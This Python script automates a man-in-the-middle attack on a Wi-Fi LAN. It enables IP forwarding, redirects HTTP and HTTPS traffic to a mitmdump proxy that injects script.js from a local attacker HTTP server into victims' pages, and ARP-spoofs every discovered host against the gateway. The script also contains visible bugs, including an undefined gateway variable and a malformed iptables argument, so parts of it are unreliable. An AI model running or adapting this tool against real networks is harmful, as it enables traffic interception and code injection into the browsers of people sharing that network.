import os
import sys
from route import *

interfaces_list = {}
targets_list = {}


def configure_routing(wifi_interface):
    # configure routing (IPTABLES)
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    os.system("iptables -t nat -A POSTROUTING -o" + wifi_interface + " -j MASQUERADE")
    os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
    os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080")



def clean_iptables():
    os.system("iptables -P INPUT ACCEPT")
    os.system("iptables -P FORWARD ACCEPT")
    os.system("iptables -P OUTPUT ACCEPT")
    os.system("iptables -t nat -F")
    os.system("iptables -t mangle -F")
    os.system("iptables -F")
    os.system("iptables -X")




def setup_tools():
    os.system("xterm -hold -e 'python3 httpServer.py' &")
    #os.system("/usr/local/bin/mitmdump -q --anticache -s 'injector.py http://192.168.0.12:8000/script.js' ")
    os.system("xterm -e mitmdump -q --anticache -s 'injector.py http://192.168.0.12:8000/script.js' -T")
    


def load_autonomous_task(wifi_interface,target_list,gateway_addy):
    
    

    # run the arpspoof for each victim, each one in a new console
    for victim in target_list:
        print("attacking victim:" + victim)
        os.system("xterm -e arpspoof -i" +  wifi_interface + " -t "  + victim + " "  + gateway + " &")
        os.system("xterm -e arpspoof -i" +  wifi_interface +  " -t " + gateway + " " + victim + " &")



def main():
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    clean_iptables()
    setup_tools()
    interfaces = get_wifi_interfaces()
    #loop over interface name in dictionary
    for key, value in interfaces.items():
        
        interface = interfaces["interface_name"]
        configure_routing(interface)
        print("Determining Gateway IP")
        gateway_ip_addy = get_gateway_address(interface)
        print("Gateway: " + gateway_ip_addy)
        print("Determining Network Ip Range")
        iprange = get_iprange(interface)
        print("Ip Range: ")
        print(iprange)
        arp_find(iprange)
        print("Determining Target List")
        print(targets_list)
        load_autonomous_task(interface,targets_list,gateway_ip_addy)
            



if __name__ == "__main__":
    #make sure ipforwarding is off to start and iptables is flushed 
    main()
